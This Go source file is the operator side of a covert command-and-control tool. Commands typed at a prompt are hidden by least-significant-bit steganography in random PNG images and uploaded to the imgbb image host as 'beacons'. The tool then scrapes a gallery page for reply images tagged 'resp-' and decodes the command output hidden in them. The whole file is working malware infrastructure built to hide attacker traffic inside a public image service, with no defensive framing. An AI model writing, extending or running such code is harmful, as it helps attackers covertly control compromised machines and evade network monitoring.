package main

import (
    "bufio"
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "image"
    "image/color"
    "image/png"
    "io"
    "io/ioutil"
    "log"
    "math/rand"
    "mime/multipart"
    "net/http"
    "os"
    "strconv"
    "strings"
    "time"
    "golang.org/x/net/html"
)

const (
    apiKey    = ""
    serverURL = ""
)

var alreadyProcessedURLS []string

func generateRandomImage(width, height, blockSize int) *image.RGBA {
    img := image.NewRGBA(image.Rect(0, 0, width, height))
    rand.Seed(time.Now().UnixNano())
    
    for y := 0; y < height; y += blockSize {
        for x := 0; x < width; x += blockSize {
            c := color.RGBA{
                uint8(rand.Intn(256)),
                uint8(rand.Intn(256)),
                uint8(rand.Intn(256)),
                255,
            }
            for by := 0; by < blockSize && y+by < height; by++ {
                for bx := 0; bx < blockSize && x+bx < width; bx++ {
                    img.Set(x+bx, y+by, c)
                }
            }
        }
    }
    return img
}

func embedTextInImage(img *image.RGBA, text string) *image.RGBA {
    base64Encoded := base64.StdEncoding.EncodeToString([]byte(text))
    messageBits := toBits(base64Encoded + "EOF")
    bounds := img.Bounds()
    width, height := bounds.Max.X, bounds.Max.Y
    bitIndex := 0

    for y := 0; y < height && bitIndex < len(messageBits); y++ {
        for x := 0; x < width && bitIndex < len(messageBits); x++ {
            r, g, b, a := img.RGBAAt(x, y).RGBA()
            r, g, b, a = r>>8, g>>8, b>>8, a>>8

            if bitIndex < len(messageBits) {
                r = setLSB(r, messageBits[bitIndex])
                bitIndex++
            }
            if bitIndex < len(messageBits) {
                g = setLSB(g, messageBits[bitIndex])
                bitIndex++
            }
            if bitIndex < len(messageBits) {
                b = setLSB(b, messageBits[bitIndex])
                bitIndex++
            }
            img.Set(x, y, color.RGBA{uint8(r), uint8(g), uint8(b), uint8(a)})
        }
    }
    return img
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}

func toBits(s string) []int {
    bits := []int{}
    for _, char := range s {
        charBits := strconv.FormatInt(int64(char), 2)
        charBits = fmt.Sprintf("%08s", charBits)
        for _, bit := range charBits {
            bits = append(bits, int(bit-'0'))
        }
    }
    return bits
}

func setLSB(value uint32, bit int) uint32 {
    return (value &^ 1) | uint32(bit)
}

func extractTextFromImage(img image.Image) (string, error) {
    bounds := img.Bounds()
    width, height := bounds.Max.X, bounds.Max.Y
    var extractedBits []int

    for y := 0; y < height; y++ {
        for x := 0; x < width; x++ {
            r, g, b, _ := img.At(x, y).RGBA()
            r, g, b = r>>8, g>>8, b>>8
            extractedBits = append(extractedBits, int(r&1))
            extractedBits = append(extractedBits, int(g&1))
            extractedBits = append(extractedBits, int(b&1))

            if len(extractedBits)%8 == 0 && containsEOF(extractedBits) {
                break
            }
        }
    }

    extractedString := bitsToString(extractedBits)
    parts := strings.Split(extractedString, "EOF")
    if len(parts) < 1 {
        return "", fmt.Errorf("no text found")
    }

    base64Decoded, err := base64.StdEncoding.DecodeString(parts[0])
    if err != nil {
        return "", err
    }
    return string(base64Decoded), nil
}

func containsEOF(bits []int) bool {
    if len(bits) < 24 {
        return false
    }
    eofBits := toBits("EOF")
    for i := 0; i < 24; i++ {
        if bits[len(bits)-24+i] != eofBits[i] {
            return false
        }
    }
    return true
}

func bitsToString(bits []int) string {
    var chars []string
    for i := 0; i < len(bits); i += 8 {
        if i+8 > len(bits) {
            break
        }
        charBits := bits[i : i+8]
        char := 0
        for _, bit := range charBits {
            char = (char << 1) | bit
        }
        chars = append(chars, string(char))
    }
    return strings.Join(chars, "")
}

func uploadImageToImgBB(imagePath string) (string, error) {
    file, err := os.Open(imagePath)
    if err != nil {
        return "", err
    }
    defer file.Close()

    var requestBody bytes.Buffer
    writer := multipart.NewWriter(&requestBody)
    fileWriter, err := writer.CreateFormFile("image", imagePath)
    if err != nil {
        return "", err
    }
    _, err = io.Copy(fileWriter, file)
    if err != nil {
        return "", err
    }
    writer.WriteField("key", apiKey)
    writer.Close()

    req, err := http.NewRequest("POST", "https://api.imgbb.com/1/upload", &requestBody)
    if err != nil {
        return "", err
    }
    req.Header.Set("Content-Type", writer.FormDataContentType())

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return "", fmt.Errorf("failed to upload image, status: %d", resp.StatusCode)
    }

    var responseMap map[string]interface{}
    err = json.NewDecoder(resp.Body).Decode(&responseMap)
    if err != nil {
        return "", err
    }

    if data, found := responseMap["data"].(map[string]interface{}); found {
        if url, exists := data["url"].(string); exists {
            return url, nil
        }
    }
    return "", fmt.Errorf("failed to retrieve image URL")
}

func scrapeImageURLFromHTML(url string) ([]string, error) {
    client := &http.Client{}
    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        return nil, err
    }
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
    req.Header.Set("Connection", "keep-alive")

    resp, err := client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return nil, fmt.Errorf("failed to fetch page, status: %d", resp.StatusCode)
    }

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    doc, err := html.Parse(bytes.NewReader(body))
    if err != nil {
        return nil, err
    }

    var imageURLs []string
    var traverse func(*html.Node)
    traverse = func(n *html.Node) {
        if n.Type == html.ElementNode && n.Data == "div" {
            for _, attr := range n.Attr {
                if attr.Key == "class" && strings.Contains(attr.Val, "list-item-image") {
                    for c := n.FirstChild; c != nil; c = c.NextSibling {
                        if c.Type == html.ElementNode && c.Data == "a" {
                            for img := c.FirstChild; img != nil; img = img.NextSibling {
                                if img.Type == html.ElementNode && img.Data == "img" {
                                    for _, attr := range img.Attr {
                                        if attr.Key == "src" {
                                            imageURLs = append(imageURLs, attr.Val)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        for c := n.FirstChild; c != nil; c = c.NextSibling {
            traverse(c)
        }
    }
    traverse(doc)

    if len(imageURLs) == 0 {
        return nil, fmt.Errorf("no images found")
    }
    return imageURLs, nil
}

func filterLinkrequests(url string) bool {
	if strings.Contains(url, "resp-") {
		return true
	}
	return false
}

func randomUID() string {
	return fmt.Sprintf("req-%d", time.Now().UnixNano())
}



func main() {
    fmt.Println("Starting server...")
    fmt.Println("Enter commands to send (type 'exit' to quit)")

    for {
        prompt := "$> "
        fmt.Print(prompt)
        
        reader := bufio.NewReader(os.Stdin)
        input, err := reader.ReadString('\n')
        if err != nil {
            log.Printf("Error reading input: %v", err)
            continue
        }
        input = strings.TrimSpace(input)
        if strings.ToLower(input) == "exit" {
            fmt.Println("Exiting program...")
            break
        }
        if input == "" {
            continue
        }
        img := generateRandomImage(256, 256, 16)
        img = embedTextInImage(img, input)
        imagePath := randomUID() + ".png"
        file, err := os.Create(imagePath)
        if err != nil {
            log.Printf("Error creating image file: %v", err)
            continue
        }
        err = png.Encode(file, img)
        if err != nil {
            log.Printf("Error encoding image: %v", err)
            file.Close()
            os.Remove(imagePath)
            continue
        }
        file.Close()
        imageURL, err := uploadImageToImgBB(imagePath)
        if err != nil {
            log.Printf("Error uploading image: %v", err)
            os.Remove(imagePath)
            continue
        }
        os.Remove(imagePath)
        
        fmt.Println("Uploaded Becon:", imageURL)
        maxAttempts := 12 
        attempt := 0
        responseFound := false

        for attempt < maxAttempts && !responseFound {
            time.Sleep(5 * time.Second)
            fmt.Printf("Checking for responses (attempt %d/%d)...\n", attempt+1, maxAttempts)
            galleryURL := serverURL
            imageURLs, err := scrapeImageURLFromHTML(galleryURL)
            if err != nil {
                log.Printf("Error scraping gallery: %v", err)
                attempt++
                continue
            }

            for _, url := range imageURLs {
                if !filterLinkrequests(url) || contains(alreadyProcessedURLS, url) {
                    continue
                }
                alreadyProcessedURLS = append(alreadyProcessedURLS, url)
                resp, err := http.Get(url)
                if err != nil {
                    log.Printf("Error fetching response image: %v", err)
                    continue
                }
                img, _, err := image.Decode(resp.Body)
                resp.Body.Close()
                if err != nil {
                    log.Printf("Error decoding response image: %v", err)
                    continue
                }
                extractedText, err := extractTextFromImage(img)
                if err != nil {
                    log.Printf("Error extracting text from response: %v", err)
                    continue
                }
                fmt.Println("----------------")
                fmt.Println(extractedText)
                fmt.Println("----------------")
                responseFound = true
            }

            if !responseFound {
                attempt++
            }
        }

        if !responseFound {
            fmt.Println("\nNo response received after 1 minute")
        }
    }
}